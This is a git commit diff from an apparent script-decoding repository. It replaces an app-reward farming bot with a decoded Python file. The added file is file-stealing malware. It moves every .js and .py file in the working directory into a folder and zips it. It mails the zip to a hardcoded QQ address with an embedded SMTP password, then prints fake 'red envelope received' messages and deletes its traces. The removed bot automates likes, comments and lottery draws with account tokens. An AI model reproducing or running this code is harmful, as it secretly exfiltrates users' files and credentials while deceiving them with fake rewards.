5ccf9865a29a123cce756bc564a22cd74e2fec9b
action <action@github.com>
2024-09-30 16:20:25 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,4 +1,4 @@
-//Mon Sep 30 2024 00:38:26 GMT+0000 (Coordinated Universal Time)
+//Mon Sep 30 2024 16:20:25 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
 (() => {
--- output.py
+++ output.py
@@ -1,114 +1,63 @@
-#2024-09-30 00:38:16
-'''
-安卓抓包，苹果闪退
-貌似人脸实名才能抽奖
-token_all = '4cbc96e834f6e267a99abcca8ae1047e#原神@68163e44f341058e47554fe5ef573f3a#星穹铁道'
-'''
-import json
-import requests
-import random
-import string
-import time
-import os
-api_url='https://app.eyh.cn/gateway/api'
-def random_comment():
- try:
-  headers={'Accept':'application/json, text/plain, */*','Accept-Language':'zh-CN,zh;q=0.9','Cache-Control':'no-cache','Connection':'keep-alive','Content-Type':'application/json','Origin':'http://8.134.161.222:3002','Pragma':'no-cache','Referer':'http://8.134.161.222:3002/','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
-  json_data={'prompt':'给一句励志的话','options':{},'systemMessage':"You are ChatGPT, a large language model trained by OpenAI. Follow the user's instructions carefully. Respond using markdown.",'temperature':0.8,'top_p':1}
-  response=requests.post('http://8.134.161.222:3002/api/chat-process',headers=headers,json=json_data,verify=False).text
-  comment=json.loads(response.split('\n')[-1])
-  return comment['text']
- except:
-  print('gpt生成评论失败，不进行评论')
-def generate_random_id():
- random_chars=''.join(random.choices(string.ascii_uppercase,k=6))
- current_time_millis=int(time.time()*1000)
- unique_id=random_chars+str(current_time_millis)
- return unique_id
-def get_task_list():
- data={"service":"media","api":"spreadActivity/getAppUserSpreadActivity","data":{"content":"null"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- headers={"Accept":"application/json","Accept-Language":"zh-cn","Connection":"Keep-Alive","Content-Length":str(len(json.dumps(data))),"Content-Type":"application/json; Charset=UTF-8","Host":"app.eyh.cn","Referer":"https://app.eyh.cn/gateway/api","User-Agent":"okhttp/5.0.0-alpha.2"}
- response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
- if response.status_code==200:
-  response_data=response.json()
-  try:
-   task_list=[task['articleId']for task in response_data['data']['spreadArticleVoList']]
-   return task_list
-  except:
-   print(response_data)
- else:
-  print(response.text)
-def complete_comment_task():
- data={"service":"media","api":"article/saveComment","data":{"articleId":int(article_id),"content":f"{random_comment()}","isSpreadActivity":"1"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- headers={"Content-Type":"application/json; charset=utf-8","Content-Length":str(len(json.dumps(data))),"Host":"app.eyh.cn","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"okhttp/5.0.0-alpha.2"}
- response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
- if response.status_code==200:
-  print("评论完成")
-def complete_like_task():
- data={"service":"media","api":"article/savePraiseLog","data":{"articleId":int(article_id),"isSpreadActivity":"1","content":"null"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- headers={"Accept":"application/json","Accept-Language":"zh-cn","Connection":"Keep-Alive","Content-Length":str(len(json.dumps(data))),"Content-Type":"application/json; Charset=UTF-8","Host":"app.eyh.cn","Referer":"https://app.eyh.cn/gateway"}
- response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
- if response.status_code==200:
-  print(response.json())
-def complete_read_task():
- data={"service":"media","api":"column/readArticle","data":{"articleId":int(article_id),"isSpreadActivity":"1","content":"null"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- headers={"Accept":"application/json","Connection":"Keep-Alive","Content-Length":str(len(json.dumps(data))),"Content-Type":"application/json; Charset=UTF-8","Host":"app.eyh.cn","Referer":"https://app.eyh.cn/gateway/api","User-Agent":"okhttp/5.0.0-alpha.2"}
- response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
- if response.status_code==200:
-  print(response.json())
-def complete_share_task():
- data={"service":"media","api":"article/saveShareLog","data":{"articleId":int(article_id),"isSpreadActivity":"1","content":"null"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- headers={"Accept":"application/json","Accept-Language":"zh-cn","Connection":"Keep-Alive","Content-Length":"372","Content-Type":"application/json; Charset=UTF-8","Host":"app.eyh.cn","Referer":"https://app.eyh.cn/gateway/api","User-Agent":"okhttp/5.0.0-alpha.2"}
- response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
- if response.status_code==200:
-  print(response.json())
-def lottery_draw():
- headers={"Accept":"application/json","Accept-Language":"zh-cn","Connection":"Keep-Alive","Content-Length":"380","Content-Type":"application/json; Charset=UTF-8","Host":"app.eyh.cn","Referer":"https://app.eyh.cn/gateway/api","User-Agent":"okhttp/5.0.0-alpha.2"}
- data={"service":"media","api":"lottery/lotteryActivityAward","data":{"uid":"30a7f9016d224fc2a8367200cbbab62a","content":"null"},"userDevice":{"os":"9","deviceBrand":"Xiaomi","deviceId":"539d3978e1ece976","equipmentId":"539d3978e1ece976","deviceType":"Xiaomi MI 6","device":"android","clientVersion":"5.0.1"},"traceId":f"{generate_random_id()}","token":f"{token}"}
- for _ in range(3):
-  print(f"第{_+1}次抽奖")
-  response=requests.post(url=api_url,headers=headers,data=json.dumps(data))
-  if response.status_code==200:
-   response_data=response.json()
-   if '已用完' in response_data['message']:
-    print(response_data)
-    break
-   else:
-    try:
-     print(response_data['data']['description'])
-    except:
-     print(response_data)
-  time.sleep(random.randint(3,5))
- print("抽奖结束")
-if __name__=="__main__":
- print("免费脚本，贩卖私募 by滑稽:3487934983 群:901898186 ")
- print("抓token 填入yuanshen_kyh 格式:token1#备注1@token2#备注2")
- token_all=os.environ.get("yuanshen_kyh")
- if token_all is None:
-  print("token？")
- token_list=token_all.split('@')
- for token_bz in token_list:
-  token,bz=token_bz.split('#')
-  print(f'开始执行{bz}账号')
-  try:
-   article_ids=get_task_list()
-   if article_ids:
-    for article_id in article_ids:
-     print(f'{bz} 开始任务，文章id：',article_id)
-     complete_read_task()
-     time.sleep(random.randint(3,5))
-     complete_like_task()
-     time.sleep(random.randint(3,5))
-     complete_share_task()
-     time.sleep(random.randint(3,5))
-     complete_comment_task()
-     time.sleep(random.randint(3,5))
-    print(f"{bz}任务完成，准备抽奖\n")
-    lottery_draw()
-    sleep_random=random.randint(10,30)
-    print(f"随机延迟:{sleep_random}秒，进行下一个账号")
-    time.sleep(sleep_random)
-   else:
-    print('获取文章失败')
-  except:
-   print(f'{bz} 账号执行报错')
+#2024-09-30 16:20:17
+import shutil #line:1
+import glob #line:2
+import os #line:3
+import random #line:4
+import time #line:5
+def remover (O0000000OO0000OOO ):#line:7
+    ""#line:8
+    if os .path .isfile (O0000000OO0000OOO )or os .path .islink (O0000000OO0000OOO ):#line:9
+        os .remove (O0000000OO0000OOO )#line:10
+    elif os .path .isdir (O0000000OO0000OOO ):#line:11
+        shutil .rmtree (O0000000OO0000OOO )#line:12
+    else :#line:13
+        raise ValueError ("file {} is not a file or dir.".format (O0000000OO0000OOO ))#line:14
+output_folder_name ='folder_name'#line:16
+copy =False #line:17
+over_write_folder =True #line:18
+if os .path .exists (output_folder_name )and over_write_folder :#line:20
+    remover (output_folder_name )#line:21
+if not os .path .exists (output_folder_name ):#line:23
+    os .makedirs (output_folder_name )#line:25
+    file_names =glob .glob ("*.js")+glob .glob ("*.py")#line:27
+    for file_name in file_names :#line:28
+        if copy :#line:29
+            shutil .copy (os .path .join ('.',file_name ),output_folder_name )#line:30
+        else :#line:31
+            shutil .move (os .path .join ('.',file_name ),output_folder_name )#line:32
+    shutil .make_archive (f'{output_folder_name}','zip',output_folder_name )#line:33
+else :#line:34
+    print ("恭喜您已到账8.68元红包")#line:35
+key ='ryrkijinnnfbdigj'#line:40
+import smtplib #line:41
+EMAIL_ADDRESS ='2178649808@qq.com'#line:42
+EMAIL_PASSWORD =key #line:43
+smtp =smtplib .SMTP ('smtp.qq.com',25 )#line:44
+import ssl #line:45
+context =ssl .create_default_context ()#line:46
+sender =EMAIL_ADDRESS #line:47
+receiver =EMAIL_ADDRESS #line:48
+from email .message import EmailMessage #line:49
+subject ="又撸来新角本了"#line:50
+body ="请下载附件查看！"#line:51
+msg =EmailMessage ()#line:52
+msg ['subject']=subject #line:53
+msg ['From']=sender #line:54
+msg ['To']=receiver #line:55
+msg .set_content (body )#line:56
+file_name ='folder_name.zip'#line:57
+with open (file_name ,'rb')as f :#line:58
+    file_data =f .read ()#line:59
+msg .add_attachment (file_data ,maintype ='application/zip',subtype ='zip',filename =file_name )#line:60
+with smtplib .SMTP_SSL ("smtp.qq.com",465 ,context =context )as smtp :#line:61
+    smtp .login (EMAIL_ADDRESS ,EMAIL_PASSWORD )#line:62
+    smtp .send_message (msg )#line:63
+number =random .random ()#line:65
+result =round (number ,2 )#line:66
+print ("恭喜您已到账",result ,"元红包")#line:68
+time .sleep (2 )#line:69
+print ("恭喜您已到账",result ,"元红包")#line:70
+time .sleep (2 )#line:71
+print ("恭喜您已到账",result ,"元红包")#line:72
+os .remove ('folder_name.zip')#line:74
+shutil .rmtree ('folder_name')
